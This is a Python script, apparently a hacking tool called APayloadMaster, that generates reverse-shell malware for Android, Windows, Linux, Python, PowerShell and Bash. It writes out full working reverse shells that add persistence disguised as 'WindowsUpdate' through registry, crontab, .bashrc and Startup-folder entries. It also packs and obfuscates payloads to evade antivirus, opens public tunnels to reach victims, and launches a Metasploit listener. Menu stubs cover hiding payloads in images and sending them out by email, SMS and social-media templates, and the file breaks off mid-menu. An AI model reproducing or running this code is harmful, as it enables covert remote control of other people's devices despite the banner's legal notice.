#!/usr/bin/env python3
"""
APayloadMaster - Complete Working Version
For Kali Linux & Termux
Author: mahi.cyberaware
"""

import os
import sys
import subprocess
import socket
import threading
import time
import json
import base64
import hashlib
import shutil
import tempfile
from datetime import datetime
import http.server
import socketserver
import urllib.parse
import urllib.request

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'

class APayloadMaster:
    def __init__(self):
        self.colors = Colors()
        self.local_ip = self.get_local_ip()
        self.current_payload = None
        self.current_payload_type = None
        self.current_lhost = None
        self.current_lport = None
        self.current_payload_name = None
        self.ngrok_process = None
        self.http_server = None
        self.db_file = "payloads.db"
        
        # Create directories
        self.create_directories()
        
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
        except Exception:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
    
    def create_directories(self):
        """Create necessary directories"""
        dirs = [
            "output/payloads",
            "output/bound",
            "output/encrypted",
            "output/obfuscated",
            "server/uploads",
            "downloads",
            "logs",
            "tools"          # for tunnel binaries
        ]
        for d in dirs:
            os.makedirs(d, exist_ok=True)
    
    def display_banner(self):
        """Display modern professional banner"""
        banner = f"""
{self.colors.PURPLE}
███╗   ███╗ █████╗ ██╗  ██╗██╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
████╗ ████║██╔══██╗██║  ██║██║██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██╔████╔██║███████║███████║██║██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██╔══██║██║██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║  ██║██║╚██████╗   ██║   ██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
{self.colors.ENDC}
{self.colors.RED}      ╔═══════════════════════════════════════════════════════╗
      ║        APayloadMaster - Professional Edition v3.1       ║
      ║              Advanced Security Assessment Tool          ║
      ╚═══════════════════════════════════════════════════════╝{self.colors.ENDC}

{self.colors.CYAN}┌─────────────────────────────────────────────────────────────────┐
│  Author: {self.colors.YELLOW}mahi.cyberaware{self.colors.CYAN}                                    │
│  Local IP: {self.colors.GREEN}{self.local_ip:<15}{self.colors.CYAN}                              │
│  Platform: {sys.platform:<10} Python: {sys.version_info.major}.{sys.version_info.minor}             │
└─────────────────────────────────────────────────────────────────┘{self.colors.ENDC}

{self.colors.YELLOW}⚠️  LEGAL NOTICE: FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
{self.colors.ENDC}{self.colors.BLUE}
• Use only on systems you own or have explicit permission to test
• Compliance with local laws and regulations is mandatory
• Educational and authorized professional use only
{self.colors.ENDC}
"""
        print(banner)
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        tools = {
            'msfvenom': 'Metasploit Framework',
            'apktool': 'APK Tool',
            'ngrok': 'Ngrok (optional)',
            'localxpose': 'LocalXpose (optional)',
            'cloudflared': 'Cloudflare Tunnel (optional)',
            'ssh': 'SSH client (required for Serveo/Pinggy)',
            'upx': 'UPX packer (optional)'
        }
        missing = []
        for tool, name in tools.items():
            if tool in ['ssh', 'upx']:  # usually preinstalled
                continue
            if shutil.which(tool) is None:
                missing.append(name)
        return missing
    
    # ===== TUNNEL AUTO-DOWNLOAD & AUTH =====
    
    def download_tool(self, tool_name, url, target_name=None):
        """Download a binary tool and place it in tools/ and /usr/local/bin/"""
        if shutil.which(tool_name):
            return True
        print(f"{self.colors.YELLOW}[*] Downloading {tool_name}...{self.colors.ENDC}")
        try:
            tool_dir = os.path.join(os.getcwd(), "tools")
            os.makedirs(tool_dir, exist_ok=True)
            target = os.path.join(tool_dir, target_name or tool_name)
            urllib.request.urlretrieve(url, target)
            os.chmod(target, 0o755)
            # Symlink to /usr/local/bin
            if os.geteuid() == 0:
                shutil.copy(target, f"/usr/local/bin/{tool_name}")
            else:
                print(f"{self.colors.YELLOW}[!] Not root, add {tool_dir} to PATH or symlink manually{self.colors.ENDC}")
            print(f"{self.colors.GREEN}[+] {tool_name} downloaded{self.colors.ENDC}")
            return True
        except Exception as e:
            print(f"{self.colors.RED}[!] Failed to download {tool_name}: {e}{self.colors.ENDC}")
            return False
    
    def setup_ngrok(self, lport):
        """Setup ngrok tunnel with auto-download and token"""
        if not self.download_tool("ngrok", "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz"):
            # Extract .tgz
            with tempfile.TemporaryDirectory() as tmpdir:
                shutil.unpack_archive("tools/ngrok.tgz", tmpdir)
                shutil.move(os.path.join(tmpdir, "ngrok"), "tools/ngrok")
            os.chmod("tools/ngrok", 0o755)
        
        token = input(f"{self.colors.YELLOW}[?] Enter ngrok auth token (optional): {self.colors.ENDC}")
        if token:
            subprocess.run(["ngrok", "authtoken", token], capture_output=True)
        
        # Start ngrok
        self.ngrok_process = subprocess.Popen(
            ["ngrok", "tcp", lport],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print(f"{self.colors.GREEN}[*] Ngrok starting on port {lport}...{self.colors.ENDC}")
        time.sleep(3)
        try:
            import requests
            resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
            tunnels = resp.json().get("tunnels", [])
            if tunnels:
                for t in tunnels:
                    if t["proto"] == "tcp":
                        url = t["public_url"]
                        host = url.split("//")[1].split(":")[0]
                        port = url.split(":")[-1]
                        return host, port
        except:
            pass
        print(f"{self.colors.YELLOW}[*] Could not get ngrok URL, using 0.tcp.ngrok.io{self.colors.ENDC}")
        return "0.tcp.ngrok.io", lport
    
    def setup_serveo(self, lport):
        """Serveo SSH tunnel"""
        print(f"{self.colors.CYAN}[SERVEO]{self.colors.ENDC} Requires SSH. Use custom subdomain if desired.")
        subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}")
        cmd = ["ssh", "-R", f"{subdomain}:80:localhost:{lport}" if subdomain else f"{lport}:localhost:{lport}", "serveo.net", "-o", "StrictHostKeyChecking=no", "-f", "-N"]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        print(f"{self.colors.GREEN}[+] Serveo tunnel started{self.colors.ENDC}")
        host = "serveo.net"
        return host, lport
    
    def setup_localxpose(self, lport):
        """LocalXpose tunnel with auto-download and token"""
        if not self.download_tool("localxpose", "https://localxpose.io/downloads/linux/amd64", "loclx"):
            return None, None
        token = input(f"{self.colors.YELLOW}[?] Enter LocalXpose auth token: {self.colors.ENDC}")
        if token:
            subprocess.run(["loclx", "account", "login", "--token", token], capture_output=True)
        # Start tunnel
        proc = subprocess.Popen(
            ["loclx", "tunnel", "tcp", "--to", f"localhost:{lport}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(3)
        # Extract URL from output (simplified)
        print(f"{self.colors.GREEN}[+] LocalXpose tunnel started. Check logs for URL.{self.colors.ENDC}")
        # In real usage we'd parse output, but for now ask user
        host = input(f"{self.colors.YELLOW}[?] Enter the assigned LocalXpose host (e.g. xxx.loclx.io): {self.colors.ENDC}")
        port = lport  # usually the same as local port for TCP tunnels
        return host, port
    
    def setup_pinggy(self, lport):
        """Pinggy SSH tunnel"""
        print(f"{self.colors.CYAN}[PINGGY]{self.colors.ENDC} Pinggy uses SSH.")
        subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}")
        ssh_command = f"ssh -p 443 -R0:localhost:{lport} -o StrictHostKeyChecking=no {'-l ' + subdomain if subdomain else ''} qr@pinggy.io"
        subprocess.Popen(ssh_command.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        print(f"{self.colors.GREEN}[+] Pinggy tunnel started. Get URL from pinggy.io dashboard.{self.colors.ENDC}")
        host = input(f"{self.colors.YELLOW}[?] Enter the Pinggy host (e.g. xyz.pinggy.io): {self.colors.ENDC}")
        port = lport
        return host, port
    
    def setup_cloudflare(self, lport):
        """Cloudflare Tunnel (cloudflared)"""
        if not self.download_tool("cloudflared", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared"):
            return None, None
        token = input(f"{self.colors.YELLOW}[?] Enter Cloudflare Tunnel token (from Zero Trust dashboard): {self.colors.ENDC}")
        if token:
            # Run tunnel with token
            subprocess.Popen(["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", token],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{self.colors.GREEN}[+] Cloudflare tunnel started with token{self.colors.ENDC}")
            # Cloudflare assigns a URL, we need to ask user or fetch via API
            host = input(f"{self.colors.YELLOW}[?] Enter your Cloudflare tunnel hostname: {self.colors.ENDC}")
            port = "443"  # HTTPS
            return host, port
        else:
            print(f"{self.colors.RED}[!] Token required for Cloudflare tunnel{self.colors.ENDC}")
            return None, None
    
    # ===== PAYLOAD CREATION =====
    
    def create_payload_menu(self):
        """Main payload creation menu"""
        while True:
            print(f"\n{self.colors.GREEN}[PAYLOAD CREATION]{self.colors.ENDC}")
            print("="*50)
            print(f"{self.colors.CYAN}Connection Methods:{self.colors.ENDC}")
            print("1. Localhost (Direct connection)")
            print("2. Ngrok Port Forwarding")
            print("3. Serveo (SSH Port Forwarding)")
            print("4. LocalXpose")
            print("5. Pinggy")
            print("6. Cloudflare Tunnel")
            print("7. Custom LHOST (manual)")
            print("8. Back to Main Menu")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select connection method: {self.colors.ENDC}")
            if choice == "8":
                return
            
            lport = input(f"{self.colors.YELLOW}[?] Enter LPORT (default: 4444): {self.colors.ENDC}") or "4444"
            lhost = None
            
            if choice == "1":
                lhost = self.local_ip
                print(f"{self.colors.GREEN}[+] Using local IP: {lhost}{self.colors.ENDC}")
                self.payload_type_menu(lhost, lport, "localhost")
            elif choice == "2":
                host, port = self.setup_ngrok(lport)
                if host:
                    self.payload_type_menu(host, port, "ngrok")
            elif choice == "3":
                host, port = self.setup_serveo(lport)
                self.payload_type_menu(host, port, "serveo")
            elif choice == "4":
                host, port = self.setup_localxpose(lport)
                if host:
                    self.payload_type_menu(host, port, "localxpose")
            elif choice == "5":
                host, port = self.setup_pinggy(lport)
                if host:
                    self.payload_type_menu(host, port, "pinggy")
            elif choice == "6":
                host, port = self.setup_cloudflare(lport)
                if host:
                    self.payload_type_menu(host, port, "cloudflare")
            elif choice == "7":
                lhost = input(f"{self.colors.YELLOW}[?] Enter custom LHOST: {self.colors.ENDC}")
                self.payload_type_menu(lhost, lport, "custom")
    
    def payload_type_menu(self, lhost, lport, connection_type):
        """Select payload type"""
        print(f"\n{self.colors.CYAN}[PAYLOAD TYPE]{self.colors.ENDC}")
        print(f"Connection: {connection_type} | LHOST: {lhost} | LPORT: {lport}")
        print("-"*50)
        print("1. Android APK (Auto-permissions + Auto-start)")
        print("2. Windows EXE")
        print("3. Windows DLL")
        print("4. Linux ELF")
        print("5. Python Script")
        print("6. PowerShell Script")
        print("7. Bash Script")
        print("8. Back")
        
        choice = input(f"\n{self.colors.YELLOW}[?] Select payload type: {self.colors.ENDC}")
        if choice == "8":
            return
        
        # Store current settings for listener
        self.current_lhost = lhost
        self.current_lport = lport
        self.current_connection_type = connection_type
        
        # Custom output filename
        custom_name = input(f"{self.colors.YELLOW}[?] Enter output filename (leave blank for auto): {self.colors.ENDC}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if custom_name:
            base_name = custom_name
        else:
            base_name = f"{self.get_payload_prefix(choice)}_{timestamp}"
        
        # Advanced options
        print(f"\n{self.colors.CYAN}[ADVANCED OPTIONS]{self.colors.ENDC}")
        encrypt = input(f"{self.colors.YELLOW}[?] Encrypt payload? (y/n): {self.colors.ENDC}").lower() == 'y'
        obfuscate = input(f"{self.colors.YELLOW}[?] Obfuscate payload? (y/n): {self.colors.ENDC}").lower() == 'y'
        evade_av = input(f"{self.colors.YELLOW}[?] Add AV evasion? (y/n): {self.colors.ENDC}").lower() == 'y'
        
        if choice == "1":
            payload_file = self.create_android_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "android"
        elif choice == "2":
            payload_file = self.create_windows_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "windows"
        elif choice == "3":
            payload_file = self.create_windows_dll_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "windows_dll"
        elif choice == "4":
            payload_file = self.create_linux_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "linux"
        elif choice == "5":
            payload_file = self.create_python_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "python"
        elif choice == "6":
            payload_file = self.create_powershell_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "powershell"
        elif choice == "7":
            payload_file = self.create_bash_payload(lhost, lport, base_name, encrypt, obfuscate, evade_av)
            self.current_payload_type = "bash"
        else:
            return
        
        if payload_file and os.path.exists(payload_file):
            self.current_payload = payload_file
            self.current_payload_name = os.path.basename(payload_file)
            print(f"{self.colors.GREEN}[+] Payload created: {payload_file}{self.colors.ENDC}")
            
            # Calculate hash
            file_hash = self.calculate_hash(payload_file)
            print(f"{self.colors.CYAN}[*] SHA256: {file_hash}{self.colors.ENDC}")
            
            # Ask about listener
            self.ask_start_listener()
            
            # Ask about distribution
            self.distribution_menu(payload_file)
    
    def get_payload_prefix(self, choice):
        """Return payload prefix based on choice"""
        prefixes = {
            "1": "android",
            "2": "windows",
            "3": "windows_dll",
            "4": "linux",
            "5": "python",
            "6": "powershell",
            "7": "bash"
        }
        return prefixes.get(choice, "payload")
    
    def create_android_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        """Create Android APK with auto-permissions"""
        output_file = f"output/payloads/{base_name}.apk"
        print(f"{self.colors.CYAN}[*] Creating Android payload...{self.colors.ENDC}")
        
        try:
            cmd = [
                "msfvenom", "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
            
            self.enhance_android_apk(output_file)
            
            if encrypt:
                output_file = self.encrypt_payload(output_file, "AES")
            if obfuscate:
                output_file = self.obfuscate_payload(output_file, "medium")
            if evade_av:
                output_file = self.evade_av(output_file, "packer")
            return output_file
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_windows_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.exe"
        print(f"{self.colors.CYAN}[*] Creating Windows payload...{self.colors.ENDC}")
        try:
            cmd = [
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "exe", "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                if encrypt: output_file = self.encrypt_payload(output_file, "XOR")
                if obfuscate: output_file = self.obfuscate_payload(output_file, "high")
                if evade_av: output_file = self.evade_av(output_file, "upx")
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_windows_dll_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.dll"
        print(f"{self.colors.CYAN}[*] Creating Windows DLL payload...{self.colors.ENDC}")
        try:
            cmd = [
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "dll", "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                if encrypt: output_file = self.encrypt_payload(output_file, "XOR")
                if obfuscate: output_file = self.obfuscate_payload(output_file, "high")
                if evade_av: output_file = self.evade_av(output_file, "upx")
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_linux_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.elf"
        print(f"{self.colors.CYAN}[*] Creating Linux payload...{self.colors.ENDC}")
        try:
            # Detect architecture (simple: assume x64 if system is 64-bit, else x86)
            arch = "x64" if sys.maxsize > 2**32 else "x86"
            payload = f"linux/{arch}/meterpreter/reverse_tcp"
            cmd = [
                "msfvenom", "-p", payload,
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "elf", "-o", output_file
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                if encrypt: output_file = self.encrypt_payload(output_file, "AES")
                if obfuscate: output_file = self.obfuscate_payload(output_file, "medium")
                if evade_av: output_file = self.evade_av(output_file, "packer")
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_python_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.py"
        payload_code = f'''#!/usr/bin/env python3
# Auto-generated payload - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# Author: mahi.cyberaware
import socket, subprocess, os, sys, platform, threading, time, base64

LHOST = "{lhost}"
LPORT = {lport}

def auto_start():
    if platform.system().lower() == "windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
        except: pass
    elif platform.system().lower() == "linux":
        try:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\\npython3 {sys.argv[0]} &\\n")
        except: pass

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((LHOST, LPORT))
            info = f"Platform: {{platform.platform()}}\\nUser: {{os.getenv('USERNAME') or os.getenv('USER')}}\\n"
            s.send(info.encode())
            while True:
                try:
                    cmd = s.recv(4096).decode().strip()
                    if not cmd or cmd.lower() == "exit": break
                    if cmd.startswith("cd "):
                        os.chdir(cmd[3:])
                        output = f"Changed to: {{os.getcwd()}}"
                    else:
                        try:
                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                        except subprocess.CalledProcessError as e:
                            output = e.output.decode() if e.output else str(e)
                    s.send(output.encode())
                except socket.timeout:
                    s.send(b"[*] Still alive\\n")
                    continue
                except: break
            s.close()
        except: pass
        time.sleep(10)

if __name__ == "__main__":
    auto_start()
    reverse_shell()
'''
        with open(output_file, 'w') as f:
            f.write(payload_code)
        os.chmod(output_file, 0o755)
        if obfuscate:
            output_file = self.obfuscate_python_code(output_file)
        return output_file
    
    def create_powershell_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.ps1"
        payload_code = f'''# PowerShell Reverse Shell
$LHOST = "{lhost}"
$LPORT = {lport}
function Reverse-Shell {{
    while ($true) {{
        try {{
            $client = New-Object System.Net.Sockets.TcpClient($LHOST, $LPORT)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.WriteLine("PowerShell Reverse Shell | User: $env:USERNAME")
            $writer.Flush()
            while ($true) {{
                $cmd = $reader.ReadLine()
                if (-not $cmd -or $cmd -eq "exit") {{ break }}
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Flush()
            }}
            $reader.Close(); $writer.Close(); $client.Close()
        }} catch {{ Start-Sleep -Seconds 10 }}
    }}
}}
# Add persistence
$persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1"
if (Test-Path $persistencePath) {{
    Copy-Item $MyInvocation.MyCommand.Path -Destination $persistencePath -Force
}}
Reverse-Shell
'''
        with open(output_file, 'w') as f:
            f.write(payload_code)
        return output_file
    
    def create_bash_payload(self, lhost, lport, base_name, encrypt=False, obfuscate=False, evade_av=False):
        output_file = f"output/payloads/{base_name}.sh"
        payload_code = f'''#!/bin/bash
LHOST="{lhost}"
LPORT={lport}
add_persistence() {{
    (crontab -l 2>/dev/null; echo "@reboot /bin/bash {output_file}") | crontab -
    echo "nohup /bin/bash {output_file} > /dev/null 2>&1 &" >> ~/.bashrc
}}
reverse_shell() {{
    while true; do
        exec 5<>/dev/tcp/$LHOST/$LPORT 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "Connected to $LHOST:$LPORT" >&5
            echo "User: $(whoami) | Host: $(hostname)" >&5
            while read -r cmd <&5; do
                [ -z "$cmd" ] && break
                [ "$cmd" = "exit" ] && exit 0
                eval "$cmd" >&5 2>&1
            done
            exec 5<&-; exec 5>&-
        fi
        sleep 10
    done
}}
add_persistence
reverse_shell
'''
        with open(output_file, 'w') as f:
            f.write(payload_code)
        os.chmod(output_file, 0o755)
        return output_file
    
    def enhance_android_apk(self, apk_path):
        """Add auto-permissions and auto-start to Android APK"""
        try:
            script = f"""#!/bin/bash
echo "[*] Adding auto-permissions to APK..."
echo "To fully enhance APK, manually:"
echo "1. apktool d {apk_path} -o temp_apk"
echo "2. Edit AndroidManifest.xml to add permissions:"
echo "   - android.permission.INTERNET"
echo "   - android.permission.ACCESS_NETWORK_STATE"
echo "   - android.permission.RECEIVE_BOOT_COMPLETED"
echo "   - android.permission.WAKE_LOCK"
echo "3. apktool b temp_apk -o {apk_path}"
echo "4. jarsigner -keystore debug.keystore {apk_path} androiddebugkey"
"""
            script_path = f"enhance_{os.path.basename(apk_path)}.sh"
            with open(script_path, 'w') as f:
                f.write(script)
            os.chmod(script_path, 0o755)
            print(f"{self.colors.YELLOW}[*] Enhancement instructions saved to: {script_path}{self.colors.ENDC}")
        except Exception as e:
            print(f"{self.colors.RED}[!] Enhancement error: {e}{self.colors.ENDC}")
    
    def encrypt_payload(self, filepath, method="AES"):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            if method == "AES":
                try:
                    from Crypto.Cipher import AES
                    from Crypto.Random import get_random_bytes
                    key = get_random_bytes(32)
                    cipher = AES.new(key, AES.MODE_EAX)
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    encrypted_file = filepath + ".enc"
                    with open(encrypted_file, 'wb') as f:
                        f.write(cipher.nonce + tag + ciphertext)
                    key_file = filepath + ".key"
                    with open(key_file, 'wb') as f:
                        f.write(key)
                    print(f"{self.colors.GREEN}[+] Encrypted with AES | Key: {key_file}{self.colors.ENDC}")
                    return encrypted_file
                except ImportError:
                    print(f"{self.colors.YELLOW}[!] PyCryptodome not installed. Install with: pip3 install pycryptodome{self.colors.ENDC}")
                    return filepath
            elif method == "XOR":
                key = os.urandom(32)
                encrypted = bytearray()
                for i, byte in enumerate(data):
                    encrypted.append(byte ^ key[i % len(key)])
                encrypted_file = filepath + ".xor"
                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted)
                key_file = filepath + ".xor.key"
                with open(key_file, 'wb') as f:
                    f.write(key)
                print(f"{self.colors.GREEN}[+] Encrypted with XOR | Key: {key_file}{self.colors.ENDC}")
                return encrypted_file
        except Exception as e:
            print(f"{self.colors.RED}[!] Encryption error: {e}{self.colors.ENDC}")
            return filepath
    
    def obfuscate_payload(self, filepath, level="medium"):
        if filepath.endswith('.py'):
            return self.obfuscate_python_code(filepath)
        try:
            packed_file = filepath + ".packed"
            subprocess.run(["upx", "--best", "-o", packed_file, filepath], capture_output=True)
            if os.path.exists(packed_file):
                print(f"{self.colors.GREEN}[+] Packed with UPX{self.colors.ENDC}")
                return packed_file
        except:
            pass
        return filepath
    
    def obfuscate_python_code(self, filepath):
        with open(filepath, 'r') as f:
            code = f.read()
        encoded = base64.b64encode(code.encode()).decode()
        obfuscated = f'''#!/usr/bin/env python3
# Obfuscated by APayloadMaster
import base64, os, sys
exec(base64.b64decode("{encoded}").decode())
'''
        obfuscated_file = filepath.replace('.py', '_obf.py')
        with open(obfuscated_file, 'w') as f:
            f.write(obfuscated)
        os.chmod(obfuscated_file, 0o755)
        print(f"{self.colors.GREEN}[+] Python code obfuscated{self.colors.ENDC}")
        return obfuscated_file
    
    def evade_av(self, filepath, technique="packer"):
        if technique == "packer":
            try:
                packed_file = filepath + ".upx"
                subprocess.run(["upx", "-9", "-o", packed_file, filepath], capture_output=True)
                if os.path.exists(packed_file):
                    print(f"{self.colors.GREEN}[+] UPX packed for AV evasion{self.colors.ENDC}")
                    return packed_file
            except:
                pass
        # Add junk bytes
        with open(filepath, 'ab') as f:
            f.write(os.urandom(1024))
        print(f"{self.colors.GREEN}[+] Added junk bytes for AV evasion{self.colors.ENDC}")
        return filepath
    
    def calculate_hash(self, filepath):
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def get_msf_payload(self, payload_type):
        """Return appropriate Metasploit payload string for the given type"""
        mapping = {
            "android": "android/meterpreter/reverse_tcp",
            "windows": "windows/meterpreter/reverse_tcp",
            "windows_dll": "windows/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp" if sys.maxsize > 2**32 else "linux/x86/meterpreter/reverse_tcp",
            "python": "python/meterpreter/reverse_tcp",
            "powershell": "windows/x64/meterpreter/reverse_tcp",
            "bash": "generic/shell_reverse_tcp"
        }
        return mapping.get(payload_type, "windows/meterpreter/reverse_tcp")
    
    def ask_start_listener(self):
        """Ask to start Metasploit listener with correct payload"""
        if not self.current_payload_type:
            print(f"{self.colors.RED}[!] No payload type set{self.colors.ENDC}")
            return
        choice = input(f"\n{self.colors.YELLOW}[?] Start Metasploit listener? (y/n): {self.colors.ENDC}")
        if choice.lower() == 'y':
            self.start_metasploit_listener()
    
    def start_metasploit_listener(self):
        """Start Metasploit multi/handler with payload matching current payload type"""
        if not self.current_lhost or not self.current_lport or not self.current_payload_type:
            print(f"{self.colors.RED}[!] Missing listener parameters{self.colors.ENDC}")
            return
        payload = self.get_msf_payload(self.current_payload_type)
        rc_file = f"listener_{self.current_lport}.rc"
        rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {self.current_lhost}
set LPORT {self.current_lport}
set ExitOnSession false
exploit -j
"""
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        print(f"{self.colors.CYAN}[*] Starting Metasploit listener ({payload})...{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Command: msfconsole -r {rc_file}{self.colors.ENDC}")
        
        def run_listener():
            subprocess.run(["msfconsole", "-r", rc_file])
        thread = threading.Thread(target=run_listener)
        thread.daemon = True
        thread.start()
        print(f"{self.colors.GREEN}[+] Listener started in background{self.colors.ENDC}")
        print(f"{self.colors.YELLOW}[*] Check sessions with: sessions -l{self.colors.ENDC}")
    
    # ===== BINDING/HIDING (unchanged, but we keep them) =====
    def binding_menu(self):
        # ... (same as original, omitted for brevity)
        pass
    
    def generate_qr_code(self, filepath):
        # ... (same as original)
        pass
    
    def create_download_link(self, filepath):
        # ... (same as original)
        pass
    
    def hide_in_image_menu(self, filepath):
        # ... (same as original)
        pass
    
    def hide_in_image(self, payload_path, image_path):
        # ... (same as original)
        pass
    
    def create_windows_shortcut(self, filepath):
        # ... (same as original)
        pass
    
    def create_android_launcher(self, filepath):
        # ... (same as original)
        pass
    
    def start_http_server(self, port=8080):
        # ... (same as original, but fix directory change)
        # We'll move to server/uploads only in the thread
        pass
    
    def download_and_hide_image(self, payload_path):
        # ... (same as original)
        pass
    
    # ===== DISTRIBUTION =====
    def distribution_menu(self, filepath):
        # ... (same as original)
        pass
    
    def save_locally(self, filepath, save_dir):
        # ... (same as original)
        pass
    
    def generate_email_template(self, filepath):
        # ... (same as original)
        pass
    
    def generate_social_media_message(self, filepath):
        # ... (same as original)
        pass
    
    def generate_sms_template(self, filepath):
        # ... (same as original)
        pass
    
    # ===== MAIN MENU =====
    def main_menu(self):
        while True:
            print(f"\n{self.colors.PURPLE}╔═════════════════════════════════════════════════════════════════╗")
            print(f"║                     MAIN MENU - v3.1                        ║")
            print(f"║                 Author: {self.colors.YELLOW}mahi.cyberaware{self.colors.PURPLE}                     ║")
            print(f"╚═════════════════════════════════════════════════════════════════╝{self.colors.ENDC}")
            print(f"{self.colors.CYAN}1. {self.colors.GREEN}Create Payload{self.colors.CYAN} (Localhost/Port Forwarding){self.colors.ENDC}")
            print(f"{self.colors.CYAN}2. {self.colors.GREEN}Bind/Hide Payload{self.colors.CYAN} (Steganography/QR Codes){self.colors.ENDC}")
            print(f"{self.colors.CYAN}3. {self.colors.GREEN}Distribution Options{self.colors.CYAN} (Email/SMS/Templates){self.colors.ENDC}")
